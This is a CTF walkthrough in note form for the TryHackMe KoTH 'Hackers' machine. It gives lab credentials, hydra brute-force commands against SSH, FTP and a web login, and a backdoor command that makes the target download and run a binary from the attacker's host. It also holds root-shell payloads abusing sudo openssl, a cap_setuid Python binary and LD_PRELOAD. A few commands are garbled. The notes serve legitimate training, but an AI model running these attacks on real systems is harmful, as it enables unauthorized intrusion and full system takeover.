
#### This machine is brute force heavy - apparently

[ChrisPritchard](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-hackers.md) *"i suspect rockyou is not the best - examining the plague server, it seems to consist of common english words - i have broken in with `caravan`, and through ssh with rcampbell as `hernandez`. I have also run hydra for the whole hour with rockyou and gotten nowhere."*

Note from FTP:
```goat
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
```
**To reiterate** [ChrisPritchard](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-hackers.md) says *"i suspect rockyou is not the best - examining the plague server, it seems to consist of common english words - i have broken in with `caravan`, and through ssh with rcampbell as `hernandez`. I have also run hydra for the whole hour with rockyou and gotten nowhere."*

```bash
hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt ssh://hackers.thm -t 64 | grep -oP "password: \K.*"

# Aquinas has also had success with `xato-net-10-million-passwords-100000.txt`
hydra -l plague -P rockyou.txt -t 64 10.10.107.80 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect"

curl -d "username=plague&password=PASS" RHOST/api/login # gets the session key
curl -H "Cookie: SessionToken=SESSIONKEY" -d "wget LHOST:1234/client -O .bash && chmod +x .bash && ./.bash" RHOST/api/cmd
```

#### Map
```lua
nmap service overview
```

#### Default Credentials - ** THIS BOX HAS RANDOM RU.txt creds** 
```
gcrawford : PAOLA
gcrawford's id_rsa : 25192519
rcampbell : molly

plague : twentyone # http://hacker.thm/backdoor
```

https://github.com/Machinh/Koth-THM/blob/main/HACKERS says
```
rcampbell:molly,april
```

#### Network Services to Foothold

Get passwords
```bash
wget ftp:// gcrawford:PAOLA/.ssh/id_rsa

ssh -i id_rsa gcrawford@hacker.thm

hydra rcampbhell /backdoor/ 

hydra -L users.txt -P rockyou.txt -t 64 ftp://hackers.thm
hydra -L users.txt -P rockyou.txt -t 64 ssh://hackers.thm
```

`/home/crawford/business.txt` leaks a `gpg` to ssh into the machine, get 

#### Privilege Escalation

openssl sudo no passwd 
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
chmod +x shell.so
sudo openssl req -engine ./shell.so
```

`/usr/bin/python3.6` has `cap_setuid+ep` - `getcap -r / 2>/dev/null`
```python
import os,pty

os.setuid(0)
pty.spawn("/bin/bash")
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

- production can run `openssl` as root via sudo. read any file with `sudo openssl enc -in source`, and write files with `sudo openssl enc -in source -out dest` or `cat source | sudo openssl -out dest`
- this can be removed with `rm /etc/sudoers.d/production`
- gcrawford can run `pico` as root via sudo
- this can be removed with `rm /etc/sudoers.d/gcrawford`
- otherwise `/usr/bin/python3.6` has the setuid capability, and can get a root shell via: `/usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
- this can be removed with `setcap -r /usr/bin/python3.6`

#### Flags
```
cat /home/crawford/business.txt | grep thm
cat /home/production/.flag
cat /home/rcampbell/.flag
cat /var/ftp/.flag
cat /root/king.txt
```

Flags for Aquinas https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-hackers.md
```
/root/.flag
/home/gcrawford/business.txt
/home/tryhackme/.flag
/home/rcampbell/.flag
/home/production/.flag
/home/production/webserver/resources/main.css
/var/ftp/.flag
/etc/vsftpd.conf
/etc/ssh/sshd_config
```

#### References
https://m3n0sd0n4ld.github.io/patoHackventuras/KoTH-Hackers
https://github.com/hoodietramp/TryHackMe-KOTH-Machine-HACKERS-Walkthrough
https://github.com/0x76OID/KOTH/blob/main/Hackers/Hackers.sh
https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-hackers.md